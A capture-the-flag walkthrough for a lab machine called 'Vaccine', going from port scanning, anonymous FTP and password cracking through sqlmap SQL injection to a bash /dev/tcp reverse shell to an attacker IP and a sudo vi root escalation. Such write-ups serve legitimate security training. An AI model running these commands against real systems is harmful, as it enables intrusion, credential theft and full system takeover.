# Vaccine

## Find open ports and services running on the target IP

Command:

```bash
nmap -sV -sC -T5 <target_ip>
```

## Connect to the FTP service using anonymous login

Command:

```bash
ftp <target_ip>
```

Credentials:

- Username: `anonymous`
- Password: *(leave blank)*

Download the available file:

```bash
get <file_name>
```

## Crack the ZIP file password using John the Ripper

Generate a hash from the ZIP file:

```bash
zip2john backup.zip > ziphashes
```

Crack the password:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ziphashes
```

Display the recovered password:

```bash
john --show ziphashes
```

Extract the ZIP file:

```bash
unzip -P <cracked_password> backup.zip
```

## Obtain administrator credentials

### Inspect the application source code

Check the contents of `index.php`:

```bash
cat index.php
```

The following credentials can be found:

```
admin:2cb42f8734ea607eefed3b70af13bbd3
```

### Crack the MD5 password hash

Save the hash to a file:

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > hash.txt
```

Crack the hash:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The administrator password will be recovered.

Log in to the web application using the obtained credentials.

## Identify SQL Injection

Navigate to the Search functionality and test for SQL Injection.

A simple payload such as:

```sql
'
```

may trigger a database error, indicating a potential SQL injection vulnerability.

Verify the vulnerability with SQLMap:

```bash
sqlmap -u "http://<target_ip>/dashboard.php?search=test" --cookie "PHPSESSID=<your_session_id>"
```

SQLMap confirms that the `search` parameter is injectable.

## Obtain an OS shell using SQL Injection

Use SQLMap to spawn an OS shell:

```bash
sqlmap -u "http://<target_ip>/dashboard.php?search=test" --cookie "PHPSESSID=<your_session_id>" --os-shell
```

This provides a basic command shell, but it is unstable and should be upgraded.

## Start a Netcat listener

Open a new terminal and start a listener:

```bash
nc -nvlp 443
```

Port `443` is commonly used for HTTPS traffic, helping the reverse shell blend in with normal network traffic.

## Establish a reverse shell

From the SQLMap OS shell, execute:

```bash
bash -c "bash -i >& /dev/tcp/<attacker_vpn_ip>/443 0>&1"
```

A reverse shell connection should be received on the Netcat listener.

## Upgrade the shell

Spawn a fully interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This provides a much more usable shell.

## Retrieve the user flag

Move to the PostgreSQL user's directory:

```bash
cd ..
```

Repeat as necessary until you reach the PostgreSQL home directory.

List files:

```bash
ls
```

Read the user flag:

```bash
cat user.txt
```

## Enumerate for privilege escalation

Since we do not know the current user's password, running `sudo -l` is not immediately useful.

Inspect the web application configuration files for stored credentials.

Navigate to the web root:

```bash
cd /var/www/html
```

Search for database credentials:

```bash
grep "pass" dashboard.php
```

Take note of the database password discovered in the source code.

## SSH into the target as postgres

Connect using the recovered credentials:

```bash
ssh postgres@<target_ip>
```

Once logged in, check sudo privileges:

```bash
sudo -l
```

Enter the PostgreSQL user's password when prompted.

The output shows that the user can execute `vi` with elevated privileges.

## Exploit sudo permissions via Vi

Launch Vi with sudo:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside Vi, execute:

```vim
:set shell=/bin/sh
```

Then:

```vim
:shell
```

This spawns a root shell.

Reference:

https://gtfobins.org/gtfobins/vi/

## Retrieve the root flag

Verify privileges:

```bash
whoami
```

Expected output:

```text
root
```

Navigate to the root directory:

```bash
cd /root
```

List files:

```bash
ls
```

Read the root flag:

```bash
cat root.txt
```

The root flag is successfully obtained.